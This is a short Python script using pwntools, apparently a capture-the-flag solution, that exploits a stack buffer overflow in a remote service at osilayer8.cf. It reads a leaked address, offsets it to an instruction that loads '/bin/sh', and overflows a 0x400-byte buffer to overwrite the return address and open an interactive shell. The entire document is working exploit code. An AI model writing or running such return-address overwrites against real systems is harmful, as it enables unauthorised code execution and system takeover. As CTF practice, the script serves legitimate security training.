from pwn import *

#p = process('nani')
p = remote('osilayer8.cf', 20103)

p.sendlineafter("> \n", "1337")
special = int(p.recvline(), 16)
real_special = special + 4 # this is the lea rdi, str.bin_sh instruction
p.sendlineafter("> \n", "1")
p.sendline("a"*0x400 + "b"*8 + p64(real_special))

p.sendlineafter("> \n", "2")
p.interactive()
